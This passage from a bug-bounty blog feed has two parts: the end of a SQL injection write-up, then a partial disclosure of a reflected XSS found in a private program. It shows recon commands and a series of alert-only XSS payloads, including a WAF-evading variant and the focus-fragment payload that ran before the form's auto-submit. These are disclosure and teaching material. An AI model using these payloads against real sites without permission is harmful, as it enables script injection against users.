  &lt;li&gt;Collaborations are one of the most beautiful things in bug bounty. Both Icko and I learned from each other and, moreover, we made money with a report that initially they weren’t going to pay for. It’s a win-win. Therefore, I recommend collaborating whenever you can, always with serious and trustworthy people.&lt;/li&gt;
  &lt;li&gt;Automatic tools like sqlmap are quite useful but sometimes they’re not enough. In this report, we saw how sqlmap was unable to retrieve information from the database, but as a hacker, I was able to do it. Perhaps this will change with the advancement of AI, but for now, automatic tools don’t replace the skills of a hacker.&lt;/li&gt;
  &lt;li&gt;Many people say that knowing programming is not necessary to hack, which has always seemed absurd to me. It may not be necessary to know programming to run a ffuf scan or exploit an SQLi with sqlmap, but it is a fundamental skill to understand why vulnerabilities exist and to be able to improvise. In this case, my programming knowledge helped me to bypass the blacklisting of the &lt;em&gt;SUBSTR&lt;/em&gt; function in MySQL by composing the &lt;em&gt;RIGHT&lt;/em&gt; and &lt;em&gt;LEFT&lt;/em&gt; functions. It’s not a big deal, but if you have no idea about programming, you wouldn’t even think that this is possible.&lt;/li&gt;
  &lt;li&gt;When you find a bug, always try to achieve maximum impact even if your report has already been accepted. In this case, I made a mistake because when I finished the PoC to retrieve the database name, I considered the exploitation finished. What I should have done is to continue escalating the vulnerability to dump any row of a table, attempt to upload a file to achieve RCE… but I did not. This way, the CVSS score could have been higher and therefore, the bounty too. Given the complexity of the exploitation, probably none of this was possible, but I should have tried.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="collaboration" /><category term="osint" /><category term="google dorking" /><category term="portswigger" /><category term="burpsuite" /><category term="0iq" /><category term="sqlmap" /><category term="sql injection" /><category term="mysql" /><category term="bypass" /><summary type="html">Partial disclosure of a bug bounty report: human 1 - sqlmap 0, defeating automation through manual exploitation.</summary></entry><entry><title type="html">Defeating XSS filters using unexpected HTML attributes</title><link href="https://hackcommander.github.io/posts/2023/12/10/reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/" rel="alternate" type="text/html" title="Defeating XSS filters using unexpected HTML attributes" /><published>2023-12-10T00:00:00+01:00</published><updated>2023-12-10T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2023/12/10/reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script</id><content type="html" xml:base="https://hackcommander.github.io/posts/2023/12/10/reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does the payload work?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post I am going to show one of the strangest XSS I have ever found: reflected XSS bypassing hidden input tag and auto-submit script in a form. I was racking my brain for several days with this XSS, and I almost gave up. I will explain step by step all the difficulties that I found, how I managed to overcome them and also some doubts that arose that I did not know how to answer.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;

&lt;p&gt;I found this asset through amass + httpx. If you are looking for http services on subdomains of the domain example.com and you have your config file in the path &lt;em&gt;/home/user/.config/amass/config.ini&lt;/em&gt;, you can use the following command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;amass enum -brute -d example.com &apos;/home/user/.config/amass/config.ini&apos; | httpx -title -tech-detect -status-code -ip -p 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6082,6346,6347,7001,7002,8080,8443,8888,30821
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/OWASP/Amass&quot;&gt;Amass&lt;/a&gt; is an OSINT tool to perform network mapping of attack surfaces and external asset discovery which is a very famous tool used in the recon step in bug bounty. The output of the above amass command is a list of subdomains of the given domain, i.e, a list of potential targets.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/projectdiscovery/httpx&quot;&gt;Httpx&lt;/a&gt; is a multi-purpose HTTP toolkit allow to run multiple probers. In this case, the input of httpx is a list of subdomains and the output is a list of subdomains that have an http service in any of the ports given as a parameter. Also it shows some additional information about the service such as the title, the detected technologies… that I have specified in the parameters to be displayed.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;This domain is one of the most important domains of the company in question&lt;/strong&gt;, so it could also be obtained by googling the name of the company without the need to use any specific subdomain discovery tool.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;

&lt;p&gt;I found this vulnerability through gau + kxss. If you are looking for XSS in the subdomain www.example.com, you can use the following command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;gau www.example.com | kxss
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/lc/gau&quot;&gt;Gau&lt;/a&gt; is a tool used to fetch known URLs from AlienVault’s Open Threat Exchange, the Wayback Machine, Common Crawl and URLScan for any given domain. This tool does not always find all the URLs of a domain but it is a good starting point to search XSS or other types of vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/Emoe/kxss&quot;&gt;Kxss&lt;/a&gt; is a tool used to find all the “problematic characters” that are reflected in the response of any URL given as a parameter. The reflection of some problematic characters does not mean that an XSS exists but it is an indication that it could exist.&lt;/p&gt;

&lt;p&gt;Both tools are based in other tools of &lt;a href=&quot;https://github.com/tomnomnom&quot;&gt;tomnomnom&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In this case I got an output like the following&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/gau-kxss-output.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The parameter had no special meaning. In fact all the parameters of the URL were vulnerable to XSS.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;

&lt;p&gt;The first thing I did was to check where the payload was reflected by sending the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HackCommander
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer was&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so the payload was reflected in the attribute &lt;em&gt;value&lt;/em&gt; of an input tag. After this I tried to send the payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot; autofocus onfocus=&quot;alert(1)&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but the WAF stopped the request, so I changed it to the payload.&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot; autofocus onfocus=&quot;[].map.call`${alert}1`&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and this was the response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see the problem was the &lt;em&gt;alert(1)&lt;/em&gt; function, but this payload bypasses the WAF without problems.&lt;/p&gt;

&lt;p&gt;However, the alert did not appear on the screen. The above payload is used a lot in XSS in the context of the attributes and that is why I used it. However, looking at the tag in which the payload is injected you can see that it is an input tag with type &lt;em&gt;hidden&lt;/em&gt;, which means that the tag is hidden, it is not visible. In these cases it is impossible to focus on the tag so the attribute &lt;em&gt;autofocus&lt;/em&gt; has no effect, it is not a valid attribute. That is why the code of the attribute &lt;em&gt;onfocus&lt;/em&gt; is never executed and therefore the payload is not valid to exploit the XSS.&lt;/p&gt;

&lt;p&gt;So there is not much to do injecting code into the input tag, so it will be necessary to break the tag and inject a new one. That’s why I sent the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[].map.call`${alert}1`&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;to inject an img tag, and this was the response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seeing this response, one would expect that the alert should be executed, but it was not. When I enabled the burpsuite proxy and sent the request, I found that another request was sent second. This request was the one associated to the form in which we were injecting code and that has an auto-submit script, that is to say, that it is sent automatically.&lt;/p&gt;

&lt;p&gt;I thought the problem might be that the img tag was being injected into a form so I sent the following payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/FORM&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[].map.call`${alert}1`&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;to check if removing the img tag from the form would execute the alert. The response was&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and the behavior was the same.&lt;/p&gt;

&lt;p&gt;In my opinion, this means that it is prioritizing the execution of the auto-submit JavaScript code before the processing of the injected img tag. However, I don’t understand why because the img tag is part of the HTML code as well as the form so it should be processed before the JavaScript code.&lt;/p&gt;

&lt;p&gt;From this idea I thought that I should think of an event that could be executed before any JavaScript code and I thought in the payload I used in the following post&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.hackcommander.com/posts/2023/06/24/reflected-xss-in-search-filter-clear-button/&quot;&gt;Reflected XSS in search filter clear button in an e-commerce website&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Maybe the focus of an attribute is executed before the auto-submit code so using the payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xss&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onfocus=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[].map.call`${alert}1`&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and adding the term &lt;em&gt;#xss&lt;/em&gt; at the end of the URL to force the focus to the injected input tag, the alert should be executed.&lt;/p&gt;

&lt;p&gt;The response was&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and the alert was executed&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-why-does-the-payload-work&quot;&gt;3.2. Why does the payload work??&lt;/h2&gt;

&lt;p&gt;This payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xss&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onfocus=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[].map.call`${alert}1`&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;works because the &lt;em&gt;#xss&lt;/em&gt; event is processed before the form’s auto-submit, which makes sense. What doesn’t make sense is that payloads such as&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/FORM&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[].map.call`${alert}1`&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;don’t work, since the tag&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[].map.call`${alert}1`&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;should be processed before the auto-submit request. So I must admit that I don’t know why that payload doesn’t work…&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/no-idea.gif&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But we are bug bounty hunters, not monkeys banging on the keyboard, so it is worth at least trying to understand what is going on. So let’s play a little.&lt;/p&gt;

&lt;p&gt;If you host the following code&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;alert from script tag 1&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;alert(&apos;alert from img tag 1&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://localhost/form-path/&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test1-name&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test1-value&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xss&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onfocus=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;alert(&apos;alert from input tag&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;alert from script tag 2&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;JavaScript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;alert from script tag 3&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;alert(&apos;alert from img tag 2&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;alert from script tag 4&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;in local and make the request &lt;em&gt;http://localhost/#xss&lt;/em&gt;, you will see the following alerts:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Displayed of &lt;em&gt;alert from script tag 1&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Displayed of &lt;em&gt;alert from script tag 2&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Displayed of &lt;em&gt;alert from img tag 1&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Displayed of &lt;em&gt;alert from input tag&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Form submit to the path &lt;em&gt;http://localhost/form-path/&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In a nutshell, this means that the JavaScript code was executed in the following order&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/execution-priority.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And this is very interesting because we can extracts some conclusions:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;There is sequentiality but within a prioritization. First executes the JavaScript code inside script tags (codes 1 and 2), then the JavaScript code of the events (codes 3 and 4) and finally the code associated with the form submission (code 5), which is also a JavaScript code between script tags but needs to process the form first.&lt;/li&gt;
  &lt;li&gt;No JavaScript code is executed after the form submission.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This does not explain why the img payload did not work, but it does explain why the focus on the input tag is done before the form submission, and therefore works. As this is not a course on JavaScript, it is sufficient to keep in mind that &lt;strong&gt;the execution priority of JavaScript code is not trivial&lt;/strong&gt; and it depends on which parts of the response is the JavaScript code.&lt;/p&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;

&lt;p&gt;As I said before, the affected domain was one the most important domains of the company so the asset criticity was classified as high. In fact at the time I reported this vulnerability there was a 3X reward multiplier on any vulnerability reported in certain domains of the company, including this one. Also an XSS usually is considered a medium severity vulnerability and because I wasn’t able to sign up and log in the website, I couldn’t demonstrate a high impact such as session hijacking. Therefore, the report was classified as&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Asset criticity&lt;/strong&gt;: High&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;: Medium&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bounty&lt;/strong&gt;: More than $600 (because of the 3X reward multiplier)&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-5&quot; /&gt;

&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;This XSS was in one of the company’s main domains so it is unlikely that nobody had discovered it before. What probably happened is that they just used automated tools or gave up before finding the right payload. So, when you find the possible existence of a vulnerability, don’t give up, try harder until you find the right payload because it surely exists.&lt;/li&gt;
